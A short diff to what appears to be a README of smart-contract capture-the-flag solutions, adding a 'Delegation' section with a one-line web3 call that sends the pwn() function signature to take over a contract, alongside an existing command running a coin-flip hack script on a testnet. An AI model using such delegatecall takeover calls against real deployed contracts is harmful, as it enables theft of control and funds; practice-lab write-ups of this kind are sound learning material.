@@ -15,3 +15,11 @@ run
 ```bash
 npx hardhat run scripts/coin_flip_hack.js --network rinkeby
 ```
+
+## Delegation
+
+```js
+await contract.sendTransaction({data: web3.eth.abi.encodeFunctionSignature("pwn()")})
+```
+
+
